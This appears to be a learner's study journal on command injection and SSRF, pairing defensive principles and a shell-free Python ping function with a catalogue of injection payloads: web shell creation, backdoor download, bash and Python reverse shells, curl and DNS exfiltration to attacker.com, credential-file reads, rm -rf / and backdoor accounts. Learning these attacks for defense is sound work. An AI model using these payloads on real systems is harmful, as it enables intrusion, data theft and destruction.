# Day 36: Secure Architecture — Defense Against Command Injection & SSRF

Today I am learning about Command Injection, SSRF, and secure architecture principles to defend against these attacks.

Web applications sometimes need to interact with the server's operating system (like file compression, network checks, or system status). If this architecture is not designed properly, the system becomes vulnerable.

---

## Command Injection — Core Logic

The biggest mistake happens when a developer mixes user input directly with operating system commands (like Linux `ping` or `ls`).

**Unsecure Design Concept:**
Imagine a network monitoring tool where a user enters an IP address and the server pings it. If the backend code sends user text directly to the shell:

`ping -c 4 [USER_INPUT]`

If there is no validation, an attacker can input something that ends the first command and starts a new command on the operating system (using `;` or `&&`). This confuses the server and executes commands outside the application's scope.

---

## The Golden Rules of Secure Architecture

Modern secure web production uses three major rules to structurally eliminate these issues:

### Rule A: Strict Whitelisting (The Best Filter)
Blacklisting (blocking bad characters) always fails because attackers find new characters. Secure systems use **Whitelisting** — a pre-defined list of allowed characters or formats. If input doesn't match the list, the request is dropped immediately.

### Rule B: Built-in APIs (No Shell Execution)
Secure developers never call the operating system shell directly. If they need to check a file or ping a network, they use the language's built-in functions or APIs, which work without touching the terminal.

### Rule C: Least Privilege Principle
The web application should run with the **minimum permissions** possible on the operating system (e.g., `www-data` or `nginx` user). If a mistake happens, the application cannot change system-wide settings.

---

## SSRF — Server-Side Request Forgery

SSRF occurs when a web application makes HTTP requests to external URLs based on user input, but fails to validate or restrict those URLs properly.

**Example:** A website allows users to upload images from external URLs. The developer only checks if the URL starts with `http://` or `https://`.

**The Flaw:** An attacker can input `http://127.0.0.1/admin_panel` — which passes the `http://` check but points to the server's own internal admin panel.

**The Impact:** The server makes a request to its own internal resource, potentially exposing sensitive internal systems that were never meant to be accessible from the outside.

---

## How to Defend Against SSRF

### 1. Internal IP Blacklisting / Whitelisting
The server should check if the IP address is localhost (`127.0.0.1`) or a private network range (`10.0.0.0/8`, `192.168.0.0/16`). If so, the request should be blocked immediately.

### 2. Network Isolation (Separation)
The public-facing web server should never be on the same network line as internal admin panels or main databases. A strict firewall should only allow authorized connections.

---

## Command Injection — Attack Commands with Explanations

### Primary Attack Vectors: Command Separators

| Separator | Meaning | Example | What Happens |
|-----------|---------|---------|--------------|
| `;` | Command terminator | `8.8.8.8; whoami` | First ping runs, then whoami runs |
| `&&` | Logical AND | `8.8.8.8 && whoami` | If ping succeeds, whoami runs |
| `||` | Logical OR | `invalid_ip || whoami` | If ping fails, whoami runs |
| `|` | Pipe | `8.8.8.8 | nc attacker.com 4444` | Sends ping output to attacker |
| `` ` `` | Command substitution | `` `whoami` `` | whoami runs first, output used in ping |
| `$()` | Command substitution (modern) | `$(whoami)` | whoami runs first, output used in ping |

---

### Reconnaissance Commands (Information Gathering)

**Command 1: `whoami`**

`Input: 8.8.8.8; whoami`

- **What it does:** Shows the current user name
- **Why dangerous:** Attacker finds which user account the web application runs under
- **Output example:** `www-data`, `nginx`, or `root`

**Command 2: `id`**

`Input: 8.8.8.8; id`

- **What it does:** Shows User ID, Group ID, and user groups
- **Why dangerous:** Attacker learns permission levels
- **Output example:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

**Command 3: `uname -a`**

`Input: 8.8.8.8; uname -a`

- **What it does:** Shows OS, kernel version, architecture
- **Why dangerous:** Helps attacker find specific exploits for the OS
- **Output example:** `Linux server1 5.4.0-42-generic #46-Ubuntu SMP x86_64`

**Command 4: `pwd`**

`Input: 8.8.8.8; pwd`

- **What it does:** Shows current working directory
- **Why dangerous:** Attacker knows where the application is running
- **Output example:** `/var/www/html`

**Command 5: `ls -la /home/`**

`Input: 8.8.8.8; ls -la /home/`

- **What it does:** Lists all users in the home directory
- **Why dangerous:** Attacker learns who is on the system
- **Output example:** `drwxr-xr-x 5 user1 user1 4096 Apr 10 10:00 user1`

---

### File System Attack Commands

**Command 6: `cat /etc/passwd`**

`Input: 8.8.8.8; cat /etc/passwd`

- **What it does:** Shows all system users and their information
- **Why dangerous:** Contains usernames, user IDs, home directories
- **Output example:** `root:x:0:0:root:/root:/bin/bash`
- **Defense note:** This file doesn't contain passwords, but usernames help attackers with brute force

**Command 7: `cat /etc/shadow`**

`Input: 8.8.8.8; cat /etc/shadow`

- **What it does:** Shows encrypted password hashes
- **Why dangerous:** Attacker can crack password hashes
- **Output example:** `root:$6$xyz...:18000:0:99999:7:::`

**Command 8: `cat /var/www/html/config.php`**

`Input: 8.8.8.8; cat /var/www/html/config.php`

- **What it does:** Reads web application configuration file
- **Why dangerous:** Contains database credentials, API keys, sensitive information
- **Output example:** `define('DB_PASSWORD', 'MySecret@123');`

**Command 9: `find / -name "*.php" -exec grep -l "password" {} \;`**

`Input: 8.8.8.8; find / -name "*.php" -exec grep -l "password" {} \;`

- **What it does:** Searches all PHP files for the word "password"
- **Why dangerous:** Automatically scans files containing sensitive data

---

### Web Shell Upload Commands

**Command 10: PHP Web Shell**

`Input: 8.8.8.8; echo "<?php eval(\$_GET['cmd']); ?>" > /var/www/html/shell.php`

- **What it does:** Creates a PHP file that lets attacker run commands via browser
- **Why dangerous:** Permanent backdoor installed
- **Result:** Attacker can now access `http://server.com/shell.php?cmd=whoami`

**Command 11: Download Backdoor**

`Input: 8.8.8.8; wget http://attacker.com/backdoor.php -O /var/www/html/backdoor.php`

- **What it does:** Downloads backdoor from attacker's server
- **Why dangerous:** Attacker can install any backdoor they want

---

### Reverse Shell Commands

**Command 12: Bash Reverse Shell**

`Input: 8.8.8.8; bash -i >& /dev/tcp/attacker.com/4444 0>&1`

- **What it does:** Connects interactive shell to attacker's machine
- **Why dangerous:** Full terminal access, as if attacker is physically on the server
- **Breakdown:**
  - `bash -i`: Start interactive shell
  - `>& /dev/tcp/attacker.com/4444`: Send output to attacker's port 4444
  - `0>&1`: Take input from the same place

**Command 13: Python Reverse Shell**

`Input: 8.8.8.8; python -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("attacker.com",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`

- **What it does:** Connects reverse shell using Python
- **Why dangerous:** Works even if bash is not available
- **How it works:**
  1. Creates a socket
  2. Connects to attacker's IP and port
  3. Maps shell stdin, stdout, stderr to the socket
  4. Starts interactive shell

---

### Data Exfiltration Commands

**Command 14: `cat /etc/passwd | base64`**

`Input: 8.8.8.8; cat /etc/passwd | base64`

- **What it does:** Encodes /etc/passwd in base64
- **Why dangerous:** Base64 data is easily transferable without detection

**Command 15: `curl http://attacker.com/steal?data=$(cat /etc/passwd | base64)`**

`Input: 8.8.8.8; curl http://attacker.com/steal?data=$(cat /etc/passwd | base64)`

- **What it does:** Sends encoded passwd file to attacker's server
- **Why dangerous:** Data automatically reaches the attacker

**Command 16: `nslookup $(whoami).attacker.com`**

`Input: 8.8.8.8; nslookup $(whoami).attacker.com`

- **What it does:** Sends DNS query to attacker's domain
- **Why dangerous:** DNS logs show the username, revealing it to the attacker
- **Result:** Attacker sees `www-data.attacker.com` in their DNS server logs

---

### System Manipulation Commands

**Command 17: `rm -rf /`**

`Input: 8.8.8.8; rm -rf /`

- **What it does:** Deletes the entire filesystem
- **Why dangerous:** Complete server destruction, data loss
- **Result:** Server crashes and won't restart

**Command 18: `chmod 777 /var/www/html/`**

`Input: 8.8.8.8; chmod 777 /var/www/html/`

- **What it does:** Gives full permissions to the web directory
- **Why dangerous:** Anyone can read, write, and execute files there

**Command 19: `useradd -m -s /bin/bash hacker`**

`Input: 8.8.8.8; useradd -m -s /bin/bash hacker`

- **What it does:** Creates a new user on the server
- **Why dangerous:** Attacker creates a permanent account
- **Result:** Attacker can now SSH into the server

**Command 20: `echo "hacker:password123" | chpasswd`**

`Input: 8.8.8.8; echo "hacker:password123" | chpasswd`

- **What it does:** Sets password for the new user
- **Why dangerous:** Attacker has permanent access
- **Result:** Attacker can log in anytime

---

## Defense Against Command Injection

### Secure Implementation Example

```python
# Secure Implementation Example
import ipaddress
import subprocess

def ping_ip(user_input):
    # Step 1: Validate IP format
    try:
        ip = ipaddress.ip_address(user_input)
    except ValueError:
        return "Invalid IP address"
    
    # Step 2: Use parameterized API (No shell)
    result = subprocess.run(['ping', '-c', '4', str(ip)], 
                           capture_output=True, text=True, check=False)
    return result.stdout
```
---
## MUST MEMORIZE (Day 36 Summary)

- **Whitelisting:** Only allow trusted inputs, reject everything else (far better than Blacklisting).
- **Least Privilege:** Give the application only the minimum permissions it needs to run.
- **Command Segregation:** Never mix user input directly with operating system terminal commands.
- **SSRF Defense:** Block internal/private IP addresses and isolate public-facing servers from internal networks.

---

## Analytical Concept Check

**Scenario:** A developer builds a website that downloads images from external links and adds them to user profiles. The developer adds a rule that the website will only download images from links starting with `http://` or `https://`.

1. If a user enters a link like `http://127.0.0.1/admin_panel`, will the developer's rule stop this request?
2. To protect internal resources, how should the server handle external requests vs internal local requests?

---

**My Analysis:**

1. No, the rule will NOT stop it. The input starts with `http://`, so it passes the check. This is a **SSRF (Server-Side Request Forgery)** vulnerability — the attacker can access internal resources.

2. The server should:
   - Block all internal/private IP addresses (`127.0.0.1`, `10.0.0.0/8`, `192.168.0.0/16`)
   - Use **Network Isolation** — keep public-facing servers separate from internal admin panels with a strict firewall

---

## What I Messed Up Today

Today I learned about Command Injection and SSRF:

- **Command Injection:** Mixing user input with OS commands allows attackers to execute arbitrary commands on the server.
- **SSRF:** Allowing user-controlled URLs without validation exposes internal systems.

The key insight is that **Whitelisting** is far superior to Blacklisting. Instead of trying to block all bad characters, define exactly what is allowed.

The most important takeaway is that **Least Privilege** and **Network Isolation** are foundational security principles. Even if an attacker exploits a vulnerability, these limits reduce the potential damage.
